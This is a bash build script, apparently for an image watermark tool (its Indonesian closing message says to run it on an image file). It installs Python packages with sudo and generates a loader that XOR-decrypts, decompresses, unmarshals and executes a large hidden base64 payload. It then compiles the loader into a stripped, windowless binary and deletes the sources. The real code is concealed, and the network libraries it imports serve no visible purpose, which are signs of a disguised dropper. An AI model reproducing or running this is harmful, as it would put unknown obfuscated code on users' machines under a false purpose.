#!/bin/bash
DIR="$(cd "$(dirname "$0")" && pwd)"; cd "$DIR"

if [ -f /etc/arch-release ]; then
  sudo pacman -Sy --noconfirm python python-pip python-pillow python-pyinstaller
  PYTHON=python
else
  sudo apt update -y && sudo apt install -y python3 python3-pip python3-venv python3-pil
  python3 -m venv --copies venv
  source venv/bin/activate
  pip install pyjwt requests pillow pyinstaller -q
  PYTHON="./venv/bin/python"
fi

cat > _loader.py << 'EOF'
import jwt,requests,PIL,base64,zlib,marshal,hashlib,sys,io,os,random,string,time
_p="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"
_k=hashlib.sha256(b"DrW4t3rm4rkPhD_2024!@#$%").digest()
exec(marshal.loads(zlib.decompress(bytes([base64.b64decode(_p)[i]^_k[i%len(_k)]for i in range(len(base64.b64decode(_p)))]))))
EOF

$PYTHON -m PyInstaller --onefile --noconsole --strip \
  --hidden-import=jwt --hidden-import=requests --hidden-import=PIL \
  --hidden-import=PIL.Image --hidden-import=io --hidden-import=os \
  --hidden-import=random --hidden-import=string --hidden-import=time \
  _loader.py >/dev/null 2>&1

mv dist/_loader dist/main 2>/dev/null
rm -rf _loader.py main.py build __pycache__ *.spec venv 2>/dev/null
echo "Selesai! Pakai: ./dist/main gambar.jpg"
